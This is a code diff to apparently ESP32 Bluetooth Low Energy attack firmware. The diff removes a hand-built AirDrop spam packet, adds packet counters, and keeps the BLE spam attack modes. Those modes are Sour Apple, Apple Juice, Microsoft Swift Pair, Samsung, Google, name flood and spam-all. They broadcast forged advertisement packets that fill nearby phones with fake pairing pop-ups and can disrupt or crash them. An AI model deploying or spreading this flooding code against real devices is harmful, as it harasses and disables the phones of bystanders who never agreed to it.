@@ -112,36 +112,6 @@ BLEAdvertisementData BLEModules::GetAdvertismentData(EBLEPayloadType type)
             }
             break;
         }
-        case AppleAirDrop: { //https://github.com/Flipper-XFW/Xtreme-Apps/blob/dev/ble_spam/protocols/continuity.c
-            AdvData_Raw = new uint8_t[24];
-            AdvData_Raw[i++] = 24 - 1;
-            AdvData_Raw[i++] = 0xFF; // AD Type (Manufacturer Specific)
-            AdvData_Raw[i++] = 0x4C; // Company ID (Apple, Inc.)
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x05;  // AirDrop Conntinuity Type
-            AdvData_Raw[i++] = 0x12; // Size
-            AdvData_Raw[i++] = 0x00; // Zeros
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x00; // ...
-            AdvData_Raw[i++] = 0x01; // Version
-            AdvData_Raw[i++] = random(256); // AppleID
-            AdvData_Raw[i++] = random(256); // ...
-            AdvData_Raw[i++] = random(256); // Phone Number
-            AdvData_Raw[i++] = random(256); // ...
-            AdvData_Raw[i++] = random(256); // Email
-            AdvData_Raw[i++] = random(256); // ...
-            AdvData_Raw[i++] = random(256); // Email2
-            AdvData_Raw[i++] = random(256); // ...
-            AdvData_Raw[i++] = 0x00; // Zero
-            
-            AdvData.addData(AdvData_Raw, 24);
-            break;
-        }
         case Microsoft: {
             String Name = generateRandomName();
 
@@ -338,28 +308,38 @@ void BLEModules::StartMode(BLEScanState mode) {
         startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_APPLE, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
     else if (mode == BLE_ATTACK_SPOOFER_SAMSUNG)
         startSpoofer(spooferDeviceIndex, BLE_SPOOFER_DEVICE_BRAND_SAMSUNG, spooferConnectableModeIndex, spooferDiscoverableModeIndex);
-    else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) 
+    else if (mode == BLE_ATTACK_EXPLOIT_SOUR_APPLE) {
         executeSwiftpair(SourApple);
-    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) 
+        AdvertisedPacketCount++;
+    }
+    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_JUICE) {
         executeSwiftpair(AppleJuice);
-    else if (mode == BLE_ATTACK_EXPLOIT_MICROSOFT)
+        AdvertisedPacketCount++;
+    }
+    else if (mode == BLE_ATTACK_EXPLOIT_MICROSOFT) {
         executeSwiftpair(Microsoft);
-    else if (mode == BLE_ATTACK_EXPLOIT_SAMSUNG)
+        AdvertisedPacketCount++;
+    }
+    else if (mode == BLE_ATTACK_EXPLOIT_SAMSUNG) {
         executeSwiftpair(Samsung);
-    else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE)
+        AdvertisedPacketCount++;
+    }
+    else if (mode == BLE_ATTACK_EXPLOIT_GOOGLE) {
         executeSwiftpair(Google);
-    else if (mode == BLE_ATTACK_EXPLOIT_NAME_FLOOD)
+        AdvertisedPacketCount++;
+    }
+    else if (mode == BLE_ATTACK_EXPLOIT_NAME_FLOOD) {
         executeSwiftpair(NameFlood);
-    else if (mode == BLE_ATTACK_EXPLOIT_APPLE_AIRDROP)
-        executeSwiftpair(AppleAirDrop);
+        AdvertisedPacketCount++;
+    }
     else if (mode == BLE_ATTACK_EXPLOIT_SPAM_ALL) {
         executeSwiftpair(SourApple, true);
         executeSwiftpair(AppleJuice, true);
-        executeSwiftpair(AppleAirDrop, true);
         executeSwiftpair(Microsoft, true);
         executeSwiftpair(Samsung, true);
         executeSwiftpair(Google, true);
         executeSwiftpair(NameFlood, true);
+        AdvertisedPacketCount++;
     }
     else if (mode == BLE_ATTACK_SPOOFER_INIT)
         initSpoofer();
@@ -597,7 +577,7 @@ void BLEModules::executeSwiftpair(EBLEPayloadType type, bool forspamall)
     pAdvertising->start();
     if (!forspamall) {
         if (type == AppleJuice) vTaskDelay(espatsettings.applejuiceSpamDelay / portTICK_PERIOD_MS);
-        else if (type == SourApple || type == AppleAirDrop) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
+        else if (type == SourApple) vTaskDelay(espatsettings.sourappleSpamDelay / portTICK_PERIOD_MS);
         else vTaskDelay(espatsettings.swiftpairSpamDelay / portTICK_PERIOD_MS);
     } else {
         vTaskDelay(espatsettings.spamAllDelay / portTICK_PERIOD_MS);
